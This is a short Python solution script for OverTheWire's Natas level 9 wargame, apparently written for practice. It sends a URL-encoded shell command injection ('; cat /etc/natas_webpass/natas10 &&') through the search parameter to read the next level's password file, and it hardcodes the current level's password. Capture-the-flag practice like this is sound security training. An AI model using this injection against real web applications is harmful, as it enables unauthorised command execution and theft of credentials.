#!/usr/bin/env python2
# -*- coding: utf-8 -*-
"""
  level9.py
  Solution for natas level9
"""
__author__ = 'kall.micke@gmail.com'

import requests
import sys
import os
import re

level = 9
user = 'natas%s' % level
host = 'http://natas%s.natas.labs.overthewire.org' % level
password = 'W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl'
referer = 'http://natas%s.natas.labs.overthewire.org/?needle=&submit=Search' % level

def get_flag():
    r = requests.get(host + '?needle=%3B+cat+%2Fetc%2Fnatas_webpass%2Fnatas10+%26%26&submit=Search', auth=(user, password), headers={'referer': referer})
    m = re.search(r'([A-Za-z0-9]{30,})', r.text[750:])
    return m.group()

if __name__ == '__main__':
    print("Flag: %s" % get_flag())
